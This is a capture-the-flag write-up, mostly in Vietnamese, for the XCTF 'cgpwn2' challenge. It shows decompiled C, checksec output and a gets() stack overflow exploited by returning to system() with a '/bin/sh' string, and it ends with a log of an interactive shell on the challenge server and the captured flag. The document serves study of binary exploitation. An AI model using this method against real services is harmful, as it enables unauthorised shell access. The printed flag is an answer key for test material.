# XCTF - PWN Exercise - cgpwn2

```c
#include<stdio.h>
string name;

int pwn()
{
  return system("echo hehehe");
}

char *hello()
{
  __int16 *p_s; // eax
  char v1; // bl
  unsigned int v2; // ecx
  __int16 *v3; // eax
  __int16 s; // [esp+12h] [ebp-26h] BYREF
  int v6; // [esp+14h] [ebp-24h] BYREF

  p_s = &s;
  v1 = 30;
  if ( ((unsigned __int8)&s & 2) != 0 )
  {
    s = 0;
    p_s = (__int16 *)&v6;
    v1 = 28;
  }
  v2 = 0;
  do
  {
    *(_DWORD *)&p_s[v2 / 2] = 0;
    v2 += 4;
  }
  while ( v2 < (v1 & 0x1Cu) );
  v3 = &p_s[v2 / 2];
  if ( (v1 & 2) != 0 )
    *v3 = 0;
    
  puts("please tell me your name");
  fgets(name, 50, stdin); 	// no cho phep luu /bin/sh vao roi goi lai de nhan shell voi bien toan cuc name 
  puts("hello,you can leave some message here:");
  return gets((char *)&s);	// tra ve dia chi bien toan cuc luu shell vao .bss roi goi dia chi
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  
  hello();
  
  puts("thank you");
  return 0;
}
```

Kiếm tra các flag secure trước.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/4_cgpwn2 λ checksec cgpwn2    
[*] '/home/l1j9m4/0_PWNable/ADworld_XCTF/Exersice/4_cgpwn2/cgpwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Đừng để ý vào đoạn đầu của code được decompile từ IDA vì mình cũng không hiểu nó viết gì :(. Cuối hàm `hello()` ta thấy chương trình nhập vào chuỗi biến toàn cục `name` tối đa 50 kí tự rồi sau đó nhập chuỗi vào `s` với offset so với return address là 0x26 + 0x4 = 0x2a bằng hàm `gets` và không có `Canary` => có thể dùng stack buffer overflow.

Ý tưởng là ta sẽ ghi đè địa chỉ trả về bằng địa chỉ plt của `system` trong hàm `pwn()` sau đó truyền đối số là chuỗi `"/bin/sh"` mà ta sẽ nhập vào ở biến toàn cục `name` trong lần nhập đầu tiên.

Tiến hành viết file [exploit.py](exploit.py) và khai thác:

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/4_cgpwn2 λ python2 exp.py
[+] Opening connection to 111.200.241.244 on port 58199: Done
[*] Switching to interactive mode
$ ls
bin
cgpwn2
dev
flag
lib
lib32
lib64
$ cat flag
cyberpeace{4a613cfb11a70856f8d649e3d9883daa}
$ 
```
